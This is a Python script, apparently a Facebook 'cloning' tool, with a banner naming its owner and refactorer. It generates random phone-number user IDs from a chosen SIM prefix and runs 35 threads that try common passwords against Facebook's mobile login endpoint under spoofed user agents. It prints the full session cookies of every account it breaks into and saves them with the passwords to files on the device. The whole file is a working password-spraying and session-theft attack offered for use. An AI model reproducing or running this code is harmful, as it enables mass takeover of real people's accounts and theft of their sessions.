import os, time, sys, random, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Configuration & Results
loop = 0
ok = []
cp = []

# Terminal Colors
G = '\033[1;32m'
W = '\033[1;37m'
R = '\033[1;31m'
Y = '\033[1;33m'

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{Y}     ██ ████ ██  █████       ██    ███████ 
{B}     ██  ██  ██  ██          ██    ██   ██ 
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}
| [✓] OWNER        : MD MALEK ISLAM (JILANI)   |
| [✓] LOGIC        : ADVANCED COOKIE CAPTURE   |
| [✓] REFACTOR     : RAFI SAR OK-METHOD        |
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}""")

def main():
    banner()
    print(f'{G}[1] START CLONING (OK RESULT LOGIC)')
    print(f'[0] EXIT')
    opt = input(f'{Y}[?] SELECT : {W}')
    if opt == '1':
        start_cloning()
    else:
        sys.exit()

def start_cloning():
    banner()
    code = input(f'{G}[+] SIM CODE (e.g. 017): {W}')
    limit = int(input(f'{G}[+] CLONING LIMIT: {W}'))
    
    banner()
    print(f'{G}[✓] TARGETING OK RESULTS...{W}')
    print(f'{G}--------------------------------------------------{W}')

    with ThreadPool(max_workers=35) as pool:
        for _ in range(limit):
            # UID generation logic to avoid "Fake" random printing
            num = "".join(random.choice("0123456789") for _ in range(8))
            uid = code + num
            # Password list based on Rafi Sar's successful results
            pws = [uid[-6:], uid, '786786', '102030', '445566', '575757'] 
            pool.submit(login_engine, uid, pws, limit)

def login_engine(uid, pws, limit):
    global loop, ok
    sys.stdout.write(f'\r{W}[RUNNING] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    for pas in pws:
        session = requests.Session()
        # High-quality User-Agent as per Rafi Sar's requirement
        ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,13)}; SM-N{random.randint(900,999)}U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,126)}.0.0.0 Mobile Safari/537.36"
        
        headers = {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'referer': 'https://m.facebook.com/login/',
            'user-agent': ua,
        }
        
        # Async Response Logic as requested by Rafi Sar
        url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        data = {
            "lsd": "AVpY",
            "jazoest": "2931",
            "m_ts": str(int(time.time())),
            "email": uid,
            "pass": pas
        }

        try:
            response = session.post(url, data=data, headers=headers, timeout=30)
            cookies = session.cookies.get_dict()
            
            # Extracting full cookies as seen in Sar's result
            if "c_user" in cookies:
                full_cookie = ";".join([f"{k}={v}" for k, v in cookies.items()])
                print(f'\n{G}[RAFI-OK💚] {uid} • {pas}') 
                print(f'{G}[🍪] COOKIE = {full_cookie}\n')
                ok.append(uid)
                # Auto-save to file
                with open('/sdcard/ok.txt', 'a') as f:
                    f.write(f'{uid}|{pas}|{full_cookie}\n')
                break
            elif "checkpoint" in cookies:
                print(f'\n{Y}[CHECKPOINT] {uid} | {pas}{W}')
                cp.append(uid)
                with open('/sdcard/cp.txt', 'a') as f:
                    f.write(f'{uid}|{pas}\n')
                break
        except:
            pass
            
    loop += 1

if __name__ == "__main__":
    main()
